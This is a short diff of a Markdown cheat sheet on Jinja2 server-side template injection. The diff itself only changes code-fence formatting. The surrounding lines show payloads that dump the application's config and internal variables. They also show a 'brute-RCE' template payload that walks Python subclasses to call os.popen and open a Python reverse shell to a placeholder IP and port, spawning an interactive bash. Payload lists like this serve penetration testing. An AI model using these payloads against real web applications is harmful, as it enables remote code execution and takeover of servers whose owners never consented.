@@ -9,12 +9,14 @@
 
 Jinja2 supports templates for the format
 
-* `{{ ... }}`
-* `{% ... %}`
+```bash
+{{ ... }}
+{% ... %}
+```
 
 ## subprocess.pOpen method
 
-```
+```bash
 # print all config vars
 {{config}}
 {{self.__dict__}}
@@ -43,7 +45,7 @@ Jinja2 supports templates for the format
 
 ### brute-RCE (without guessing mro class)
 
-```
+```bash
 {% for x in ().class.base.subclasses() %}{% if "warning" in x.name %}{{x()._module.builtins['import']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash", "-i"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
